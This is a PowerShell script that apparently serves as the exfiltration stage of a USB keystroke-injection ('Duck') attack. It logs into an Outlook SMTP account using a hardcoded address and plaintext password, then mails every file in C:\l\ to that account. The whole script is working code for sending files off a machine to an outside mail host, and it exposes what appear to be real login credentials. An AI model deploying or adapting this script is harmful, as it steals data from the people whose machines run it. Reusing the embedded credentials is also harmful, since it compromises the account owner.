$SMTPServer = 'smtp-mail.outlook.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 25)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jardelribeirobage@hotmail.com', 'jardelbage123');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'jardelribeirobage@hotmail.com'
$ReportEmail.To.Add('jardelribeirobage@hotmail.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Mail Sent Successfully"
